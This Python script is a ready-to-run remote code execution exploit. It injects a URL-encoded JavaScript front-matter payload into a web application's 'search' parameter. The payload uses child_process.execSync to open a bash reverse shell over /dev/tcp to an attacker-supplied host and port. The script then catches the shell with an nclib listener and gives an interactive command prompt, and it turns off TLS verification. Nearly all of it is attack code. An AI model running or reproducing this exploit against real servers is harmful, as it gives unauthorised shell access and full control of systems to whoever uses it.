import sys
import nclib
import requests

# URL format check
def url_format_check(url):
    if not(url.startswith('http://') or url.startswith('https://')):
        raise ValueError('URL should start with http:// or https://')
    
# Prepare session
def prepare_session(proxy):
    session = requests.Session()
    session.verify = False

    if proxy:
        proxies = {
            'http': proxy,
            'https': proxy
        }

        session.proxies = proxies

    return session

# Netcat listener for python
def netcat_listener(lhost, lport):
    # For tracing sending and reciving bytes add `verbose=True` flag  
    listener = nclib.TCPServer((lhost, lport))

    print(f'Listining on {lhost}:{lport}')
    
    return listener 


# Exploit vulnerability
def exploit(session, url, lhost, lport):
    # Start Nnetcat listener
    listener = netcat_listener('0.0.0.0', lport)

    parameter = 'search'
    payload = f'---javascript%0a((require(%22child_process%22))%2eexecSync(%22bash+-c+%27bash+--posix+-i+>%26+/dev/tcp/{lhost}/{lport}+0>%261%27%22))%0a---RCE'
    url = f'{url}/?{parameter}={payload}'

    # Run exploit and wait for reverse shell
    session.get(url)

    for client in listener:
        cmd = ''
        while cmd != 'exit':
            try:
                # POSIX shell end with '$'
                result = client.read_until('$')
                print(result.decode('utf-8'))

                cmd = input('\nshell# ')
                client.writeln(cmd.encode('utf-8'))
            except KeyboardInterrupt:
                print('Process is closing')
                exit(1)
            except Exception as e:
                print(f'An error occured: {e}')
                exit(1)
        print("Client disconnected!")
        exit(1)

if __name__ == '__main__':
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) 

    # Check if the correct number of arguments is provided
    if len(sys.argv) < 4:
        print(f'Usage: {sys.argv[0]} <url> <lhost> <lport> <proxy>(optional)')
        sys.exit(1)
  
    # Parse arguments
    url, lhost, lport, proxy = sys.argv[1], sys.argv[2], int(sys.argv[3]), None

    # Check proxy
    if len(sys.argv) == 5:
        proxy = sys.argv[4]

    # Check URL format
    url_format_check(url)

    # Set session
    session = prepare_session(proxy)

    # Exploit
    exploit(session, url, lhost, lport)
